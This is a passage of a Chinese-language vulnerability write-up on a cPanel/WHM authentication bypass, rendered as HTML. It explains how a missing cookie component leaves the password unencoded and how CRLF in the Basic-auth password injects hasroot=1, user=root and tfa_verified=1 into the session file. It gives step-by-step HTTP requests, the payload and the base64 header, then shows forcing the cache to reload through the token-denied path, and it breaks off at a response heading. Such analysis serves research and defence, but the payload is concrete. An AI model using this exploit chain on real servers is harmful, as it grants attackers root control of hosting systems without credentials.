+<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">my</span> <span class="variable">$ob</span> = get_ob_part(\<span class="variable">$session</span>);   <span class="comment"># 从 cookie 提取 &lt;ob&gt; 部分</span></span><br><span class="line"><span class="keyword">my</span> <span class="variable">$encoder</span> = <span class="variable">$ob</span> &amp;&amp; Cpanel::Session::Encoder-&gt;new(<span class="string">&#x27;secret&#x27;</span> =&gt; <span class="variable">$ob</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$encoder</span> &amp;&amp; <span class="keyword">length</span> <span class="variable">$session_ref</span>-&gt;&#123;<span class="string">&#x27;pass&#x27;</span>&#125;) &#123;</span><br><span class="line">    <span class="keyword">local</span> <span class="variable">$session_ref</span>-&gt;&#123;<span class="string">&#x27;pass&#x27;</span>&#125; = <span class="variable">$encoder</span>-&gt;encode_data(<span class="variable">$session_ref</span>-&gt;&#123;<span class="string">&#x27;pass&#x27;</span>&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>问题所在：只有当 $ob 存在时才会对密码进行编码。</p>
+<p>如果攻击者故意让 cookie 中没有逗号后的 <ob> 部分（只发 :Wg_mjzgt1hyfXefK），则：</p>
+<ul>
+<li>$ob 为空</li>
+<li>$encoder 为空（falsy）</li>
+<li>密码直接以明文形式写入 session 文件，没有任何编码</li>
+</ul>
+<h3 id="Bug-2：set-pass-不过滤-r-n"><a href="#Bug-2：set-pass-不过滤-r-n" class="headerlink" title="Bug 2：set_pass 不过滤 \r\n"></a>Bug 2：set_pass 不过滤 \r\n</h3><p>处理 Basic 认证时，密码经过 set_pass 处理：</p>
+<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">my</span> (<span class="variable">$user</span>, <span class="variable">$pass</span>) = <span class="keyword">split</span>(<span class="regexp">/:/</span>, decode_base64(<span class="variable">$encoded</span>), <span class="number">2</span>);</span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$server_obj</span>-&gt;auth-&gt;set_user(<span class="variable">$user</span>);   <span class="comment"># 只过滤 \0 和 /</span></span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$server_obj</span>-&gt;auth-&gt;set_pass(<span class="variable">$pass</span>);   <span class="comment"># 只过滤 \0，没过滤 \r\n！</span></span><br><span class="line"><span class="variable">$SESSION_ref</span>-&gt;&#123;<span class="string">&#x27;pass&#x27;</span>&#125; = <span class="variable">$pass</span>;</span><br><span class="line">Cpanel::Session::saveSession(<span class="variable">$session</span>, <span class="variable">$SESSION_ref</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>set_pass 只过滤了\0，没有过滤 \r\n。</p>
+<h3 id="漏洞的化学反应"><a href="#漏洞的化学反应" class="headerlink" title="漏洞的化学反应"></a>漏洞的化学反应</h3><p>cPanel session 文件格式是 key&#x3D;value\r\n。当密码值中包含 \r\n 时：</p>
+<p>正常 session 文件内容：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pass=正确密码</span><br><span class="line">user=root</span><br><span class="line">tfa_verified=0</span><br></pre></td></tr></table></figure></div>
+
+<p>注入 CRLF 后：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pass=x</span><br><span class="line">hasroot=1</span><br><span class="line">user=root</span><br><span class="line">tfa_verified=1</span><br><span class="line">cp_security_token=/cpsess9999999999</span><br><span class="line">successful_internal_auth_with_timestamp=1777462149</span><br></pre></td></tr></table></figure></div>
+
+<p>解析器将把后续内容视为 6 行独立的 key&#x3D;value 记录！hasroot&#x3D;1、user&#x3D;root、tfa_verified&#x3D;1 全都成为 session 文件的顶层字段。</p>
+<hr>
+<h2 id="第三部分：完整攻击流程"><a href="#第三部分：完整攻击流程" class="headerlink" title="第三部分：完整攻击流程"></a>第三部分：完整攻击流程</h2><h3 id="Step-1：Mint-预认证-Session"><a href="#Step-1：Mint-预认证-Session" class="headerlink" title="Step 1：Mint 预认证 Session"></a>Step 1：Mint 预认证 Session</h3><p>发送一个错误的登录尝试，服务器创建 session 文件：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /login/?login_only=1 HTTP/1.1</span><br><span class="line">Host: target:2087</span><br><span class="line"></span><br><span class="line">user=root&amp;pass=wrong</span><br></pre></td></tr></table></figure></div>
+
+<p>响应：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: whostmgrsession=%3aWg_mjzgt1hyfXefK%2c4d257abc...</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Step-2：注入-CRLF-—-发送无-的-Cookie"><a href="#Step-2：注入-CRLF-—-发送无-的-Cookie" class="headerlink" title="Step 2：注入 CRLF — 发送无  的 Cookie"></a>Step 2：注入 CRLF — 发送无 <ob> 的 Cookie</h3><p>将 cookie 中的逗号和后面的 <ob> 部分删掉，只发送：:Wg_mjzgt1hyfXefK（URL 编码为 %3aWg_mjzgt1hyfXefK）。</p>
+<p>这样 get_ob_part 拿到的 $ob 为空，密码不会被编码。</p>
+<p>然后在密码中构造 CRLF 注入 payload：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root:x</span><br><span class="line">hasroot=1</span><br><span class="line">tfa_verified=1</span><br><span class="line">user=root</span><br><span class="line">cp_security_token=/cpsess9999999999</span><br><span class="line">successful_internal_auth_with_timestamp=1777462149</span><br></pre></td></tr></table></figure></div>
+
+<p>Base64 编码后发送：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: target:2087</span><br><span class="line">Cookie: whostmgrsession=%3aWg_mjzgt1hyfXefK</span><br><span class="line">Authorization: Basic cm9vdDp4DQpoYXNyb290PTENCnRmYV92ZXJpZmllZD0x...</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Step-3：Session-文件被污染"><a href="#Step-3：Session-文件被污染" class="headerlink" title="Step 3：Session 文件被污染"></a>Step 3：Session 文件被污染</h3><p>磁盘上的 session 文件变成：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tfa_verified=0$</span><br><span class="line">ip_address=172.17.0.1$</span><br><span class="line">user=root$</span><br><span class="line">pass=x   &lt;-- \r\n 后注入内容开始</span><br><span class="line">hasroot=1   &lt;-- 注入的</span><br><span class="line">tfa_verified=1   &lt;-- 注入的</span><br><span class="line">user=root   &lt;-- 注入的</span><br><span class="line">cp_security_token=/cpsess9999999999   &lt;-- 注入的</span><br><span class="line">successful_internal_auth_with_timestamp=1777462149   &lt;-- 注入的</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
+
+<p>六个新行作为独立记录写入 session 文件！</p>
+<h3 id="Step-4：服务器返回-307-重定向"><a href="#Step-4：服务器返回-307-重定向" class="headerlink" title="Step 4：服务器返回 307 重定向"></a>Step 4：服务器返回 307 重定向</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 307 Moved</span><br><span class="line">Location: /cpsess0228251236/</span><br></pre></td></tr></table></figure></div>
+
+<p>服务器认为认证成功。</p>
+<h3 id="Step-5：访问版本信息验证是否成功绕过"><a href="#Step-5：访问版本信息验证是否成功绕过" class="headerlink" title="Step 5：访问版本信息验证是否成功绕过"></a>Step 5：访问版本信息验证是否成功绕过</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /cpsess0228251236/json-api/version HTTP/1.1</span><br><span class="line">Host: target:2087</span><br><span class="line">Cookie: whostmgrsession=%3aQSJN_sFdKZtCi2o_</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure></div>
+
+<p>返回</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 403 Forbidden Access denied</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/plain; charset=&quot;utf-8&quot;</span><br><span class="line"></span><br><span class="line">&#123;&quot;cpanelresult&quot;:&#123;&quot;apiversion&quot;:&quot;2&quot;,&quot;error&quot;:&quot;Access denied&quot;,&quot;data&quot;:&#123;&quot;reason&quot;:&quot;Access denied&quot;,&quot;result&quot;:&quot;0&quot;&#125;,&quot;type&quot;:&quot;text&quot;&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>绕过失败了，为什么失败，因为解析器 LoadSession不是读取原始的 key&#x3D;value 文件，而是读取 cache 目录下的 JSON 序列化文件：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/var/cpanel/sessions/raw/:Wg_mjzgt1hyfXefK   &lt;-- 原始行式文件</span><br><span class="line">/var/cpanel/sessions/cache/:Wg_mjzgt1hyfXefK  &lt;-- JSON 序列化缓存</span><br></pre></td></tr></table></figure></div>
+
+<p>loadSession 优先读取 cache（JSON 文件），只有 cache 加载失败时才回退到读取原始文件。JSON 文件没有被 CRLF 污染，所以注入的内容没生效。</p>
+<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">loadSession</span> </span>&#123;</span><br><span class="line">    <span class="keyword">my</span> (<span class="variable">$session</span>) = <span class="variable">@_</span>;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">my</span> <span class="variable">$session_file</span>  = get_session_file_path(<span class="variable">$session</span>); <span class="comment"># /var/cpanel/sessions/raw/&lt;id&gt;</span></span><br><span class="line">    <span class="keyword">my</span> <span class="variable">$session_cache</span> = <span class="variable">$Cpanel::Config::Session::SESSION_DIR</span> . <span class="string">&#x27;/cache/&#x27;</span> . <span class="variable">$session</span>;</span><br><span class="line">    <span class="keyword">my</span> <span class="variable">$session_ref</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># First try the binary cache. AdminBin::Serializer is JSON.</span></span><br><span class="line">    <span class="keyword">if</span> ( <span class="variable">$session_cache_fh</span> = _open_if_exists_or_warn(<span class="variable">$session_cache</span>) ) &#123;</span><br><span class="line">        <span class="keyword">eval</span> &#123;</span><br><span class="line">            <span class="keyword">local</span> <span class="variable">$SIG</span><span class="string">&#123;__DIE__&#125;</span>;</span><br><span class="line">            <span class="variable">$session_ref</span> = Cpanel::AdminBin::Serializer::LoadFile(<span class="variable">$session_cache_fh</span>);</span><br><span class="line">            <span class="variable">$mtime</span>       = ( <span class="keyword">stat</span>(<span class="variable">$session_cache_fh</span>) )[<span class="number">9</span>];</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Only fall through to the slow text parse if the cache load failed or returned nothing.</span></span><br><span class="line">    <span class="keyword">if</span> ( !<span class="keyword">keys</span> <span class="variable">%$</span>session_ref ) &#123;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$session_fh</span> = _open_if_exists_or_warn(<span class="variable">$session_file</span>) ) &#123;</span><br><span class="line">            <span class="keyword">require</span> Cpanel::Config::LoadConfig;</span><br><span class="line">            <span class="variable">$session_ref</span> = Cpanel::Config::LoadConfig::parse_from_filehandle(</span><br><span class="line">                <span class="variable">$session_fh</span>, <span class="string">delimiter =&gt;</span> <span class="string">&#x27;=&#x27;</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>所以在缓存里，加载器实际看到的是：</p>
+<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;tfa_verified&quot;</span>:<span class="string">&quot;0&quot;</span>,</span><br><span class="line"><span class="string">&quot;ip_address&quot;</span>:<span class="string">&quot;172.17.0.1&quot;</span>,</span><br><span class="line"><span class="string">&quot;user&quot;</span>:<span class="string">&quot;root&quot;</span>,</span><br><span class="line"><span class="string">&quot;login_theme&quot;</span>:<span class="string">&quot;cpanel&quot;</span>,</span><br><span class="line"><span class="string">&quot;port&quot;</span>:<span class="string">&quot;43586&quot;</span>,</span><br><span class="line"><span class="string">&quot;origin_as_string&quot;</span>:<span class="string">&quot;address=172.17.0.1,app=whostmgrd,method=badpass&quot;</span>,</span><br><span class="line"><span class="string">&quot;pass&quot;</span>:<span class="string">&quot;x\r\nhasroot=1\r\ntfa_verified=1\r\nuser=root\r\ncp_security_token=/cpsess9999999999\r\nsuccessful_internal_auth_with_timestamp=1777462149&quot;</span>,</span><br><span class="line"><span class="string">&quot;hulk_registered&quot;</span>:<span class="string">&quot;0&quot;</span>,</span><br><span class="line"><span class="string">&quot;local_port&quot;</span>:<span class="string">&quot;2087&quot;</span>,</span><br><span class="line"><span class="string">&quot;cp_security_token&quot;</span>:<span class="string">&quot;/cpsess0228251236&quot;</span>,</span><br><span class="line"><span class="string">&quot;external_validation_token&quot;</span>:<span class="string">&quot;ss27XQjbY11gmCDs&quot;</span>,</span><br><span class="line"><span class="string">&quot;local_ip_address&quot;</span>:<span class="string">&quot;172.17.0.2&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>加载到变量里面之后是这样：</p>
+<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$SESSION_ref</span> = &#123;</span><br><span class="line">    <span class="string">user                      =&gt;</span> <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">    <span class="string">pass                      =&gt;</span> <span class="string">&quot;x\r\nhasroot=1\r\ntfa_verified=1\r\n...&quot;</span>,</span><br><span class="line">    <span class="string">cp_security_token         =&gt;</span> <span class="string">&#x27;/cpsess0228251236&#x27;</span>,</span><br><span class="line">    <span class="string">tfa_verified              =&gt;</span> <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="comment"># ...no hasroot, no successful_internal_auth_with_timestamp</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<hr>
+<h2 id="第四部分：Cache-机制与绕过"><a href="#第四部分：Cache-机制与绕过" class="headerlink" title="第四部分：Cache 机制与绕过"></a>第四部分：Cache 机制与绕过</h2><p>在 Step 5 的时候，我们看见有一个函数 parse_from_filehandle，算是一种在 cache 读取不到的时候的备用模式</p>
+<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="keyword">keys</span> <span class="variable">%$</span>session_ref ) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="variable">$session_fh</span> = _open_if_exists_or_warn(<span class="variable">$session_file</span>) ) &#123;</span><br><span class="line">        <span class="keyword">require</span> Cpanel::Config::LoadConfig;</span><br><span class="line">        <span class="variable">$session_ref</span> = Cpanel::Config::LoadConfig::parse_from_filehandle(</span><br><span class="line">            <span class="variable">$session_fh</span>, <span class="string">delimiter =&gt;</span> <span class="string">&#x27;=&#x27;</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>查找这个函数，发现有两处调用过这个函数：</p>
+<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">grep</span> -rn <span class="string">&#x27;LoadConfig::loadConfig\|parse_from_filehandle&#x27;</span>  /usr/<span class="keyword">local</span>/cpanel/Cpanel/Session*</span><br><span class="line"></span><br><span class="line"><span class="regexp">/usr/l</span>ocal/cpanel/Cpanel/Session/Load.pm:<span class="number">69</span>:   parse_from_filehandle(...)        <span class="comment"># the loader, fallback path</span></span><br><span class="line">/usr/<span class="keyword">local</span>/cpanel/Cpanel/Session/Modify.pm:<span class="number">97</span>: LoadConfig::loadConfig(<span class="variable">$session_file</span>, ...,</span><br><span class="line">                                                    &#123; <span class="string">&#x27;nocache&#x27;</span> =&gt; <span class="number">1</span>, ... &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>跟进Modify.pm文件，发现有两个函数值得关注</p>
+<p>这是一个绕过 cache，直接读 raw 的构造函数</p>
+<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">new</span> </span>&#123;</span><br><span class="line">    <span class="keyword">my</span> ( <span class="variable">$class</span>, <span class="variable">$session</span>, <span class="variable">$check_expiration</span> ) = <span class="variable">@_</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="variable">$check_expiration</span> ? !Cpanel::Session::Load::session_exists_and_is_current(<span class="variable">$session</span>) : !Cpanel::Session::Load::session_exists(<span class="variable">$session</span>) ) &#123;</span><br><span class="line">        <span class="keyword">die</span> <span class="string">&quot;The session  ^`^|<span class="variable">$session</span> ^`^&#125; does not exist&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Cpanel::Session::Load::get_ob_part( \<span class="variable">$session</span> );    <span class="comment"># strip ob_part</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">my</span> <span class="variable">$session_file</span> = Cpanel::Session::Load::get_session_file_path(<span class="variable">$session</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Cpanel::Transaction not available here due to memory constraints</span></span><br><span class="line">    <span class="keyword">my</span> ( <span class="variable">$ref</span>, <span class="variable">$fh</span>, <span class="variable">$conflock</span> ) = Cpanel::Config::LoadConfig::loadConfig( <span class="regexp">//</span> (<span class="number">1</span>)</span><br><span class="line">        <span class="variable">$session_file</span>,</span><br><span class="line">        <span class="keyword">undef</span>,</span><br><span class="line">        <span class="string">&#x27;=&#x27;</span>,</span><br><span class="line">        <span class="keyword">undef</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        &#123; <span class="string">&#x27;skip_readable_check&#x27;</span> =&gt; <span class="number">1</span>, <span class="string">&#x27;nocache&#x27;</span> =&gt; <span class="number">1</span>, <span class="string">&#x27;keep_locked_open&#x27;</span> =&gt; <span class="number">1</span>, <span class="string">&#x27;rw&#x27;</span> =&gt; <span class="number">1</span> &#125; // (<span class="number">2</span>)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">bless</span> &#123;</span><br><span class="line">        <span class="string">&#x27;_session&#x27;</span> =&gt; <span class="variable">$session</span>,</span><br><span class="line">        <span class="string">&#x27;_fh&#x27;</span>      =&gt; <span class="variable">$fh</span>,</span><br><span class="line">        <span class="string">&#x27;_lock&#x27;</span>    =&gt; <span class="variable">$conflock</span>,</span><br><span class="line">        <span class="string">&#x27;_data&#x27;</span>    =&gt; Cpanel::Session::decode_origin(<span class="variable">$ref</span>),</span><br><span class="line">    &#125;, <span class="variable">$class</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>现在如果我们能触发任何预授权可达的代码路径，调用 Modify：：new 并调用 Modify：：save 在我们的会话中，注入就会作为顶层密钥提升到 JSON 缓存中。</p>
+<p>在寻找 new friend 的时候，发现了一个函数，这个函数在 (1) 处调用了 Modify::new，在 (2) 处调用了 Modify::save，正是我们需要的</p>
+<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">do_token_denied</span> </span>&#123;</span><br><span class="line">    <span class="keyword">my</span> (<span class="variable">$error_msg</span>, <span class="variable">$form_ref</span>, <span class="variable">$goto_uri</span>, <span class="variable">$use_theme</span>) = <span class="variable">@_</span>;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">my</span> <span class="variable">$max_tries</span> = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$user_provided_session_ref</span> = <span class="variable">$server_obj</span>-&gt;get_current_session_ref_if_exists) &#123;</span><br><span class="line">        <span class="keyword">my</span> <span class="variable">$session</span> = <span class="variable">$server_obj</span>-&gt;get_current_session;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">not</span> <span class="variable">$server_obj</span>-&gt;request-&gt;get_supplied_security_token</span><br><span class="line">            <span class="keyword">or</span> ++<span class="variable">$user_provided_session_ref</span>-&gt;&#123;<span class="string">&#x27;token_denied&#x27;</span>&#125; &lt; <span class="variable">$max_tries</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">require</span> Cpanel::Session::Modify;</span><br><span class="line">            <span class="keyword">my</span> <span class="variable">$session_mod</span> = <span class="string">&#x27;Cpanel::Session::Modify&#x27;</span>-&gt;new(<span class="variable">$session</span>);     <span class="comment"># (1)</span></span><br><span class="line">            <span class="variable">$session_mod</span>-&gt;set(<span class="string">&#x27;token_denied&#x27;</span>,</span><br><span class="line">                <span class="keyword">defined</span> <span class="variable">$session_mod</span>-&gt;get(<span class="string">&#x27;token_denied&#x27;</span>)</span><br><span class="line">                ? <span class="variable">$session_mod</span>-&gt;get(<span class="string">&#x27;token_denied&#x27;</span>) + <span class="number">1</span></span><br><span class="line">                : <span class="number">1</span></span><br><span class="line">            );</span><br><span class="line">            <span class="variable">$session_mod</span>-&gt;save;                                             <span class="comment"># (2)</span></span><br><span class="line">            <span class="variable">$another_try</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>解释一下，每当某些 URL 被请求时，会调用 check_security_token do_token_denied</p>
+<p>实现方式如下——在（1）时检查提供的安全令牌，如果失败，在（2）时调用 do_token_denied：</p>
+<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">check_security_token</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">not</span> <span class="variable">$server_obj</span>-&gt;request-&gt;get_supplied_security_token) &#123;</span><br><span class="line">        <span class="variable">$failmsg</span> = <span class="string">&#x27;security token missing&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elsif</span> (<span class="variable">$ENV</span>&#123;<span class="string">&#x27;cp_security_token&#x27;</span>&#125; <span class="keyword">ne</span> <span class="variable">$server_obj</span>-&gt;request-&gt;get_supplied_security_token)  &#123; <span class="regexp">//</span> (<span class="number">1</span>)</span><br><span class="line">        <span class="variable">$failmsg</span> = <span class="string">&#x27;security token incorrect&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$failmsg</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$is_login_url</span>) &#123;</span><br><span class="line">            <span class="variable">$server_obj</span>-&gt;badpass(...);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            failedlogin(<span class="variable">$failmsg</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable">$server_obj</span>-&gt;connection-&gt;set_is_last_request(<span class="number">1</span>);</span><br><span class="line">            do_token_denied(<span class="variable">$failmsg</span>);                       <span class="comment"># (2)</span></span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>如果你想知道什么是安全令牌——几乎所有发送给 cpsrvd 的 HTTP 请求在 URI 中都会有一个令牌前缀：</p>
+<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/cpsess1234567890/scripts2/listaccts</span><br></pre></td></tr></table></figure></div>
+
+<p>其中的 cpsess1234567890 就是安全令牌，所以当我们发送没有带安全令牌的请求的时候，就会强制触发 do_token_denied 函数</p>
+<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /scripts2/listaccts HTTP/<span class="number">1.1</span></span><br><span class="line">Host: target:<span class="number">2087</span></span><br><span class="line">Cookie: whostmgrsession=<span class="variable">%3aQSJN_sFdKZtCi2o_</span></span><br><span class="line">Connection: <span class="keyword">close</span></span><br></pre></td></tr></table></figure></div>
+
+<p>响应</p>
